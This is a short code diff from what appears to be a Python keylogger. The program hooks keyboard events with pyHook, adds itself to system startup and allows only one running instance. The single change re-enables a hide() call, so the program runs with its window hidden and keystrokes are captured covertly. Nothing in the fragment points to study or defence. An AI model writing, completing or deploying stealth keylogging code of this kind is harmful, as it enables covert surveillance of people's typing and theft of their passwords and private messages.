@@ -195,7 +195,7 @@ def main():
     hm.HookKeyboard()
     pythoncom.PumpMessages()
 
-##hide()
+hide()
 addStartup()
 hm = pyHook.HookManager()
 disallow_Multiple_Instances()
